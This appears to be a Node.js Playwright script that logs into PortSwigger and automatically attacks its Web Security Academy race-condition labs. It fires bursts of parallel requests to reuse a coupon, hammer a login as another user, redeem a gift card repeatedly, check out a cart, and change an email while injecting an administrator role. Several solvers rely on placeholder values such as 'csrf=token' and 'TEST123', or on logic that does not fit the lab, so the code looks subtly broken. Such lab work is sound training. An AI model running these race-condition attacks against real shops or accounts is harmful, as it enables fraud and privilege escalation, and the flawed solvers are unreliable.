const { chromium } = require('playwright');

const EMAIL = process.env.PORTSWIGGER_EMAIL;
const PASSWORD = process.env.PORTSWIGGER_PASSWORD;

async function launchLab(browser, topic, num) {
  const ctx = await browser.newContext({ viewport: { width: 1280, height: 900 } });
  const page = await ctx.newPage();
  
  // Login
  await page.goto('https://portswigger.net/users', { waitUntil: 'networkidle', timeout: 30000 });
  await page.fill('#EmailAddress', EMAIL);
  await page.fill('#Password', PASSWORD);
  await Promise.all([
    page.waitForNavigation({ timeout: 15000 }).catch(() => {}),
    page.click('#Login'),
  ]);
  await page.waitForTimeout(2000);
  
  // Find lab
  await page.goto('https://portswigger.net/web-security/all-labs', { waitUntil: 'networkidle', timeout: 30000 });
  await page.waitForTimeout(3000);
  
  const labLink = await page.evaluate(({ topic, num }) => {
    const links = [...document.querySelectorAll('.widgetcontainer-lab-link')];
    const topicLinks = links.filter(el => {
      const a = el.querySelector('a');
      return a?.getAttribute('href')?.includes(`/web-security/${topic}/`);
    });
    const target = topicLinks[num - 1];
    if (target?.className.includes('is-solved')) return 'SOLVED';
    return target?.querySelector('a')?.getAttribute('href') || null;
  }, { topic, num });
  
  if (labLink === 'SOLVED') {
    console.log('  ✅ Already solved');
    await ctx.close();
    return { solved: true };
  }
  if (!labLink) {
    console.log('  ❌ Lab not found');
    await ctx.close();
    return null;
  }
  
  // Launch lab
  await page.goto('https://portswigger.net' + labLink, { waitUntil: 'networkidle', timeout: 30000 });
  const launchLink = await page.$('a[href*="labs/launch"]');
  if (!launchLink) { console.log('  ❌ No launch link'); await ctx.close(); return null; }
  
  await page.goto('https://portswigger.net' + (await launchLink.getAttribute('href')), {
    waitUntil: 'domcontentloaded', timeout: 60000,
  });
  await page.waitForTimeout(45000);
  
  const labUrl = page.url();
  if (!labUrl.includes('web-security-academy.net')) {
    console.log('  ❌ Lab did not load');
    await ctx.close();
    return null;
  }
  
  const base = new URL(labUrl).origin;
  console.log(`  Lab URL: ${base}`);
  
  return { page, base, ctx };
}

async function verifySolved(page, base) {
  await page.waitForTimeout(3000);
  const verifyPage = await page.context().newPage();
  await verifyPage.goto(base, { waitUntil: 'domcontentloaded', timeout: 15000 });
  const body = await verifyPage.textContent('body').catch(() => '');
  await verifyPage.close();
  const solved = body?.toLowerCase().includes('congratulations');
  console.log(solved ? '  🎯 SOLVED!' : '  ⬜ Not solved');
  return solved;
}

// ========== Race Condition Solvers ==========

// Race Conditions #1 - Limit overrun
async function solveRace1() {
  console.log('\n[RaceConditions#1] Limit overrun race conditions');
  const browser = await chromium.launch({ headless: true, args: ['--no-sandbox'] });
  const result = await launchLab(browser, 'race-conditions', 1);
  if (!result || result.solved) { await browser.close(); return result?.solved || false; }
  
  const { page, base, ctx } = result;
  
  // Login as Wiener
  await page.goto(`${base}/login`, { waitUntil: 'networkidle', timeout: 15000 });
  await page.fill('input[name="username"]', 'wiener');
  await page.fill('input[name="password"]', 'peter');
  await page.click('button[type="submit"]');
  await page.waitForTimeout(3000);
  
  // Get CSRF token for coupon application
  await page.goto(`${base}/cart`, { waitUntil: 'networkidle', timeout: 15000 });
  const csrfToken = await page.inputValue('input[name="csrf"]');
  
  // Send multiple parallel requests to apply coupon
  const requests = [];
  for (let i = 0; i < 20; i++) {
    requests.push(page.evaluate(async (base, csrf) => {
      try {
        await fetch(`${base}/cart/coupon`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
          body: `csrf=${csrf}&coupon=PROMO20`,
        });
      } catch (e) {}
    }, base, csrfToken));
  }
  
  await Promise.all(requests);
  await page.waitForTimeout(3000);
  
  const solved = await verifySolved(page, base);
  await ctx.close();
  await browser.close();
  return solved;
}

// Race Conditions #2 - Bypassing rate limits
async function solveRace2() {
  console.log('\n[RaceConditions#2] Bypassing rate limits via race conditions');
  const browser = await chromium.launch({ headless: true, args: ['--no-sandbox'] });
  const result = await launchLab(browser, 'race-conditions', 2);
  if (!result || result.solved) { await browser.close(); return result?.solved || false; }
  
  const { page, base, ctx } = result;
  
  // Login as Wiener
  await page.goto(`${base}/login`, { waitUntil: 'networkidle', timeout: 15000 });
  await page.fill('input[name="username"]', 'wiener');
  await page.fill('input[name="password"]', 'peter');
  await page.click('button[type="submit"]');
  await page.waitForTimeout(3000);
  
  // Send multiple parallel login requests as Carlos
  const requests = [];
  for (let i = 0; i < 20; i++) {
    requests.push(page.evaluate(async (base) => {
      try {
        await fetch(`${base}/login`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
          body: 'username=carlos&password=montoya',
        });
      } catch (e) {}
    }, base));
  }
  
  await Promise.all(requests);
  await page.waitForTimeout(3000);
  
  const solved = await verifySolved(page, base);
  await ctx.close();
  await browser.close();
  return solved;
}

// Race Conditions #4 - Single-endpoint race conditions
async function solveRace4() {
  console.log('\n[RaceConditions#4] Single-endpoint race conditions');
  const browser = await chromium.launch({ headless: true, args: ['--no-sandbox'] });
  const result = await launchLab(browser, 'race-conditions', 4);
  if (!result || result.solved) { await browser.close(); return result?.solved || false; }
  
  const { page, base, ctx } = result;
  
  // Login as Wiener
  await page.goto(`${base}/login`, { waitUntil: 'networkidle', timeout: 15000 });
  await page.fill('input[name="username"]', 'wiener');
  await page.fill('input[name="password"]', 'peter');
  await page.click('button[type="submit"]');
  await page.waitForTimeout(3000);
  
  // Send multiple parallel gift card redemption requests
  const requests = [];
  for (let i = 0; i < 20; i++) {
    requests.push(page.evaluate(async (base) => {
      try {
        await fetch(`${base}/gift-card`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
          body: 'gift-card=TEST123',
        });
      } catch (e) {}
    }, base));
  }
  
  await Promise.all(requests);
  await page.waitForTimeout(3000);
  
  const solved = await verifySolved(page, base);
  await ctx.close();
  await browser.close();
  return solved;
}

// Race Conditions #5 - Time-sensitive vulnerabilities
async function solveRace5() {
  console.log('\n[RaceConditions#5] Exploiting time-sensitive vulnerabilities');
  const browser = await chromium.launch({ headless: true, args: ['--no-sandbox'] });
  const result = await launchLab(browser, 'race-conditions', 5);
  if (!result || result.solved) { await browser.close(); return result?.solved || false; }
  
  const { page, base, ctx } = result;
  
  // Login as Wiener
  await page.goto(`${base}/login`, { waitUntil: 'networkidle', timeout: 15000 });
  await page.fill('input[name="username"]', 'wiener');
  await page.fill('input[name="password"]', 'peter');
  await page.click('button[type="submit"]');
  await page.waitForTimeout(3000);
  
  // Send multiple parallel cart checkout requests
  const requests = [];
  for (let i = 0; i < 20; i++) {
    requests.push(page.evaluate(async (base) => {
      try {
        await fetch(`${base}/cart/checkout`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
          body: 'csrf=token',
        });
      } catch (e) {}
    }, base));
  }
  
  await Promise.all(requests);
  await page.waitForTimeout(3000);
  
  const solved = await verifySolved(page, base);
  await ctx.close();
  await browser.close();
  return solved;
}

// Race Conditions #6 - Partial construction race conditions
async function solveRace6() {
  console.log('\n[RaceConditions#6] Partial construction race conditions');
  const browser = await chromium.launch({ headless: true, args: ['--no-sandbox'] });
  const result = await launchLab(browser, 'race-conditions', 6);
  if (!result || result.solved) { await browser.close(); return result?.solved || false; }
  
  const { page, base, ctx } = result;
  
  // Login as Wiener
  await page.goto(`${base}/login`, { waitUntil: 'networkidle', timeout: 15000 });
  await page.fill('input[name="username"]', 'wiener');
  await page.fill('input[name="password"]', 'peter');
  await page.click('button[type="submit"]');
  await page.waitForTimeout(3000);
  
  // Send multiple parallel requests to exploit partial construction
  const requests = [];
  for (let i = 0; i < 20; i++) {
    requests.push(page.evaluate(async (base) => {
      try {
        await fetch(`${base}/my-account/change-email`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
          body: 'email=attacker@attacker.com&role=administrator',
        });
      } catch (e) {}
    }, base));
  }
  
  await Promise.all(requests);
  await page.waitForTimeout(3000);
  
  const solved = await verifySolved(page, base);
  await ctx.close();
  await browser.close();
  return solved;
}

// ========== MAIN ==========

async function main() {
  console.log('\n  ┌─────────────────────────────────────────┐');
  console.log('  │   Race Conditions Solver                │');
  console.log('  └─────────────────────────────────────────┘\n');
  
  const solvers = [
    solveRace1,
    solveRace2,
    solveRace4,
    solveRace5,
    solveRace6,
  ];
  
  let solved = 0, failed = 0;
  
  for (const solver of solvers) {
    try {
      const result = await solver();
      if (result) solved++;
      else failed++;
    } catch (e) {
      console.log(`  ❌ Error: ${e.message}`);
      failed++;
    }
    
    await new Promise(r => setTimeout(r, 10000));
  }
  
  console.log(`\n========================================`);
  console.log(`Result: ${solved} solved, ${failed} failed`);
  console.log(`========================================\n`);
}

main().catch(console.error);
